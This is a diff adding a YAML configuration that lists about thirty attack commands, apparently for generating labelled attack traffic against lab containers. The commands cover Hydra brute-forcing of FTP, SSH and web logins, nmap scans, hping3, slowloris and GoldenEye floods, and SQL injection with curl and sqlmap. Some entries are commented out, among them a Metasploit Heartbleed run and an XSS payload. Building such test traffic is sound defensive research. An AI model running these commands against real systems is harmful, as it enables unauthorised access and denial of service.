@@ -1,0 +1,156 @@
+- category: FTP-Patator
+  command: hydra -t 4 -l testuser -P /wordlists/passwords.txt ftp-lab -s 21 ftp
+  destination: ftp
+  intensity: medium
+  name: 1. FTP brute-force - multiple passwords for single user
+
+- category: FTP-Patator
+  command: hydra -t 4 -L /wordlists/usernames.txt -P /wordlists/passwords.txt -s 21 ftp-lab ftp -vV
+  destination: ftp
+  intensity: high
+  name: 2. FTP brute-force - multiple usernames and passwords
+
+- category: PortScan
+  command: nmap -sS -p 1-1000 ssh-lab
+  destination: ssh
+  intensity: low
+  name: 3. PortScan - TCP SYN scan on SSH
+
+- category: PortScan
+  command: nmap -sT -p 1-1000 ssh-lab
+  destination: ssh
+  intensity: medium
+  name: 4. PortScan - full TCP connect scan
+
+- category: PortScan
+  command: nmap -sS -p 21 ftp-lab
+  destination: ftp
+  intensity: low
+  name: 5. PortScan - TCP SYN scan on FTP port
+
+- category: PortScan
+  command: nmap -sT -p 20-21 ftp-lab
+  destination: ftp
+  intensity: medium
+  name: 6. PortScan - full TCP connect scan on common FTP ports
+
+- category: SSH-Patator
+  command: hydra -t 4 -L /wordlists/usernames.txt -P /wordlists/passwords.txt ssh-lab -s 22 ssh
+  destination: ssh
+  intensity: high
+  name: 7. SSH brute-force with Hydra
+
+- category: brute_force
+  command: hydra -l root -P /wordlists/usernames.txt ssh-lab ssh -s 22 -t 1 -w 5
+  intensity: low  
+  name: 8. SSH brute force – fast, low intensity
+
+- category: brute_force
+  command: hydra -l root -P /wordlists/usernames.txt ssh-lab ssh -s 22 -t 8
+  intensity: high
+  name: 9. SSH brute force – aggressive
+
+- category: brute_force
+  command: hydra -L /wordlists/users.txt -p test ftp-lab ftp -s 21 -t 4
+  intensity: medium
+  name: 10. FTP brute force – login enumeration
+
+- category: brute_force
+  command: hydra -l ftp -P /wordlists/pass.txt ftp-lab ftp -s 21
+  intensity: medium
+  name: 11. FTP brute force – medium intensity
+
+- category: brute_force
+  command: hydra -L /wordlists/users.txt -P /wordlists/pass.txt ftp-lab http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed" -s 21
+  intensity: medium
+  name: 12. Web brute force login – medium
+
+- category: ddos
+  command: hping3 -S --flood -p 80 dvwa
+  intensity: high
+  name: 13. DDoS – hping3 flood
+
+- category: ddos
+  command: slowloris dvwa -p 80 -s 50
+  intensity: medium
+  name: 14. DDoS – slowloris 50 connections
+
+- category: ddos
+  command: slowloris dvwa -p 80 -s 200
+  intensity: high
+  name: 15. DDoS – slowloris 200 connections
+
+- category: ddos
+  command: timeout 10 hping3 -S --flood -p 22 ssh-lab
+  intensity: high
+  name: 16. DDoS – TCP flood on SSH port
+
+- category: dos
+  command: timeout 20 python3 /opt/goldeneye/goldeneye.py http://127.0.0.1:8080 -w 10 -s 5 -m post
+  intensity: high
+  name: 17. DoS – GoldenEye HTTP flood
+
+# - category: dos
+#   command: timeout 10 python3 /opt/hulk/hulk.py http://127.0.0.1:8080
+#   intensity: high
+#   name: 18. DoS – Hulk HTTP flood
+
+# - category: dos
+#   command: slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://127.0.0.1:8080 -x 24 -p 3
+#   intensity: medium
+#   name: 19. DoS – Slowhttptest GET flood
+
+- category: dos
+  command: timeout 10 slowloris dvwa -p 8080
+  intensity: medium
+  name: 20. DoS – Slowloris attack
+
+# - category: exploit
+#   command: msfconsole -q -x 'use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS 172.17.0.1; set RPORT 443; run'
+#   intensity: high
+#   name: 21. Heartbleed exploit (Metasploit)
+
+- category: port_scanning
+  command: nmap -sS -p- ssh-lab
+  intensity: high
+  name: 22. Port scan – full range
+
+- category: port_scanning
+  command: nmap -sS -F ftp-lab
+  intensity: low
+  name: 23. Port scan – fast (-F)
+
+- category: port_scanning
+  command: nmap -sS --scan-delay 200ms dvwa
+  intensity: medium
+  name: 24. Port scan – stealthy with delay
+
+# - category: scan
+#   command: nmap -sS -T4 -Pn 172.17.0.1 -p 22,21,80,2222,2121,8080
+#   intensity: low
+#   name: 25. Port scanning – full TCP scan
+
+- category: sql_injection
+  command: curl 'http://dvwa:80/vulnerabilities/sqli/?id=1' --data-urlencode "id=1' OR 1=1 --"
+  intensity: low
+  name: 26. SQL injection – manual curl
+
+- category: sql_injection
+  command: sqlmap -u 'http://dvwa:80/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=fake' --level=1 --batch
+  intensity: medium
+  name: 27. SQL injection – sqlmap level 1
+
+- category: sql_injection
+  command: sqlmap -u 'http://dvwa:80/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=fake' --level=5 --risk=3 --batch
+  intensity: high
+  name: 28. SQL injection – sqlmap level 5
+
+# - category: sql_injection
+#   command: sqlmap -u "http://172.17.0.1:8080/vulnerable.php?id=1" --dbs --batch
+#   intensity: high
+#   name: 29. Web SQL Injection – aggressive
+
+# - category: xss
+#   command: xsser --url "http://172.17.0.1:8080/vulnerable.php" --data "q=<script>alert(1)</script>"
+#   intensity: low
+#   name: 30. Web XSS attack – reflected
